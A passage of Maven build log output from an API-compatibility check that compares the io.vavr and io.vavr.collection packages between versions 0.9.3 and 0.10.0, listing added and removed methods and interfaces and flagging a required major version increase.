io.vavr.Function1\n[INFO]      < class io.vavr.Predicates\n[INFO]          + method not(java.util.function.Predicate)\n[INFO]              + access static\n[INFO]              + return java.util.function.Predicate\n[INFO]      < class io.vavr.Tuple0\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple1\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple1\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple2\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple3\n[INFO]          + method concat(io.vavr.Tuple4)\n[INFO]              + return io.vavr.Tuple4\n[INFO]          + method concat(io.vavr.Tuple5)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple6)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple7)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple8)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple1\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple2\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple2\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple3\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple4\n[INFO]          + method concat(io.vavr.Tuple4)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple5)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple6)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple7)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple2\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple3\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple3\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple4\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple4)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple5)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple6)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple3\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple4\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple4\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple4)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple5)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple4\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple5\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple4)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple5\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple6\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple3)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple6\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple7\n[INFO]          + method concat(io.vavr.Tuple2)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < class io.vavr.Tuple7\n[INFO]          + method append(java.lang.Object)\n[INFO]              + return io.vavr.Tuple8\n[INFO]          + method concat(io.vavr.Tuple1)\n[INFO]              + return io.vavr.Tuple8\n[INFO]      < interface io.vavr.API$Match$Case\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + field serialVersionUID\n[INFO]              + access final\n[INFO]              + access static\n[INFO]              + constant 1\n[INFO]              + return long\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < interface io.vavr.API$Match$Pattern\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]      < interface io.vavr.CheckedConsumer\n[INFO]          + method andThen(io.vavr.CheckedConsumer)\n[INFO]              + return io.vavr.CheckedConsumer\n[INFO]          + method of(io.vavr.CheckedConsumer)\n[INFO]              + access static\n[INFO]              + return io.vavr.CheckedConsumer\n[INFO]          + method unchecked()\n[INFO]              + return java.util.function.Consumer\n[INFO]      > interface io.vavr.CheckedFunction0\n[INFO]          - implements io.vavr.Lambda\n[INFO]          + implements java.util.concurrent.Callable\n[INFO]          + method call()\n[INFO]              + return java.lang.Object\n[INFO]      > interface io.vavr.CheckedFunction1\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction2\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction3\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction4\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction5\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction6\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction7\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.CheckedFunction8\n[INFO]          - implements io.vavr.Lambda\n[INFO]      < interface io.vavr.CheckedPredicate\n[INFO]          + method of(io.vavr.CheckedPredicate)\n[INFO]              + access static\n[INFO]              + return io.vavr.CheckedPredicate\n[INFO]          + method unchecked()\n[INFO]              + return java.util.function.Predicate\n[INFO]      < interface io.vavr.CheckedRunnable\n[INFO]          + method of(io.vavr.CheckedRunnable)\n[INFO]              + access static\n[INFO]              + return io.vavr.CheckedRunnable\n[INFO]          + method unchecked()\n[INFO]              + return java.lang.Runnable\n[INFO]      > interface io.vavr.Function0\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function2\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function3\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function4\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function5\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function6\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function7\n[INFO]          - implements io.vavr.Lambda\n[INFO]      > interface io.vavr.Function8\n[INFO]          - implements io.vavr.Lambda\n[INFO]      - interface io.vavr.Lambda$Memoized\n[INFO]          - access abstract\n[INFO]          - access static\n[INFO]          - method of(java.util.Map,io.vavr.Tuple,io.vavr.Function1)\n[INFO]              - access static\n[INFO]              - return java.lang.Object\n[INFO]      < interface io.vavr.PartialFunction\n[INFO]          + implements io.vavr.Function1\n[INFO]          + implements java.io.Serializable\n[INFO]          + implements java.util.function.Function\n[INFO]          + field serialVersionUID\n[INFO]              + access final\n[INFO]              + access static\n[INFO]              + constant 1\n[INFO]              + return long\n[INFO]          + method andThen(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method arity()\n[INFO]              + return int\n[INFO]          + method compose(java.util.function.Function)\n[INFO]              + return io.vavr.Function1\n[INFO]          + method curried()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method getIfDefined()\n[INFO]              + access static\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method isMemoized()\n[INFO]              + return boolean\n[INFO]          + method lift()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method memoized()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method partial(java.util.function.Predicate)\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          + method reversed()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method tupled()\n[INFO]              + return io.vavr.Function1\n[INFO]          + method unlift(java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return io.vavr.PartialFunction\n[INFO]      < interface io.vavr.Tuple\n[INFO]          + method hash(java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]          + method hash(java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return int\n[INFO]      < interface io.vavr.Value\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      + version 0.10.0\n[INFO]      - version 0.9.3\n[INFO] -----------------------------------------------------------------------------------------------------------\n[INFO] > io.vavr.collection                                 major      0.10.0     0.9.3      1.0.0      Version increase required\n[INFO]      < class io.vavr.collection.Array\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Array\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Array\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Array\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Array\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Array\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Array\n[INFO]      > class io.vavr.collection.BitSetModule$AbstractBitSet\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return java.lang.Boolean\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.BitSet\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      > class io.vavr.collection.BitSetModule$BitSet1\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return java.lang.Boolean\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.BitSet\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      > class io.vavr.collection.BitSetModule$BitSet2\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return java.lang.Boolean\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.BitSet\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      < class io.vavr.collection.BitSetModule$BitSetIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.BitSetModule$BitSetN\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return java.lang.Boolean\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.BitSet\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      < class io.vavr.collection.CharSeq\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.CharSeq\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.CharSeq\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.CharSeq\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.CharSeq\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.CharSeq\n[INFO]      < class io.vavr.collection.HashArrayMappedTrieModule$LeafNodeIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.HashMap\n[INFO]          + method collector(java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method collector(java.util.function.Function,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.HashMap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.HashMap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.HashMap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.HashMap\n[INFO]          > method values()\n[INFO]              - return io.vavr.collection.Seq\n[INFO]              + return io.vavr.collection.Stream\n[INFO]      > class io.vavr.collection.HashMultimap\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return io.vavr.collection.Traversable\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asMap()\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      < class io.vavr.collection.HashMultimap$Builder\n[INFO]          + method fill(int,io.vavr.Tuple2)\n[INFO]              + return io.vavr.collection.HashMultimap\n[INFO]      < class io.vavr.collection.HashSet\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.HashSet\n[INFO]      < class io.vavr.collection.IteratorModule$CachedIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.IteratorModule$ConcatIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.IteratorModule$DistinctIterator\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Iterator\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      < class io.vavr.collection.LinkedHashMap\n[INFO]          + method collector(java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method collector(java.util.function.Function,java.util.function.Function)\n[INFO]              + access static\n[INFO]              + return java.util.stream.Collector\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.LinkedHashMap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.LinkedHashMap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.LinkedHashMap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.LinkedHashMap\n[INFO]      > class io.vavr.collection.LinkedHashMultimap\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - return io.vavr.collection.Traversable\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asMap()\n[INFO]              + return io.vavr.collection.Map\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.BiPredicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectKeys(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          + method rejectValues(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Multimap\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]      < class io.vavr.collection.LinkedHashMultimap$Builder\n[INFO]          + method fill(int,io.vavr.Tuple2)\n[INFO]              + return io.vavr.collection.LinkedHashMultimap\n[INFO]      < class io.vavr.collection.LinkedHashSet\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.LinkedHashSet\n[INFO]      > class io.vavr.collection.PriorityQueue\n[INFO]          > method dropUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.AbstractQueue\n[INFO]              - return io.vavr.collection.PriorityQueue\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + annotated io.vavr.collection.GwtIncompatible\n[INFO]              + return io.vavr.collection.PriorityQueue\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.AbstractQueue\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.Queue\n[INFO]          > method dropUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.AbstractQueue\n[INFO]              - return io.vavr.collection.Queue\n[INFO]          + method fill(int,java.lang.Object)\n[INFO]              + access static\n[INFO]              + return io.vavr.collection.Queue\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.AbstractQueue\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Queue\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Queue\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Queue\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Queue\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]      > class io.vavr.collection.Stream$Cons\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements java.util.function.Function\n[INFO]          - method andThen(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method apply(java.lang.Integer)\n[INFO]              - return java.lang.Object\n[INFO]          - method apply(java.lang.Object)\n[INFO]              - access abstract\n[INFO]              - return java.lang.Object\n[INFO]          - method arity()\n[INFO]              - return int\n[INFO]          + method asPartialFunction()\n[INFO]              + return io.vavr.PartialFunction\n[INFO]          - method compose(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method curried()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method forEachWithIndex(java.util.function.ObjIntConsumer)\n[INFO]              + return void\n[INFO]          - method isMemoized()\n[INFO]              - return boolean\n[INFO]          - method lift()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method memoized()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method partial(java.util.function.Predicate)\n[INFO]              - return io.vavr.PartialFunction\n[INFO]          + method reject(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          - method reversed()\n[INFO]              - return io.vavr.Function1\n[INFO]          + method rotateLeft(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method rotateRight(int)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightUntil(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method takeRightWhile(java.util.function.Predicate)\n[INFO]              + return io.vavr.collection.Stream\n[INFO]          + method toJavaArray(java.util.function.IntFunction)\n[INFO]              + return java.lang.Object[]\n[INFO]          + method toTree(java.util.function.Function,java.util.function.Function)\n[INFO]              + return io.vavr.collection.List\n[INFO]          - method tupled()\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefault(java.util.function.Function)\n[INFO]              - return io.vavr.Function1\n[INFO]          - method withDefaultValue(java.lang.Object)\n[INFO]              - return io.vavr.Function1\n[INFO]      > class io.vavr.collection.StreamModule$AppendElements\n[INFO]          - implements io.vavr.Function1\n[INFO]          - implements io.vavr.Lambda\n[INFO]          - implements 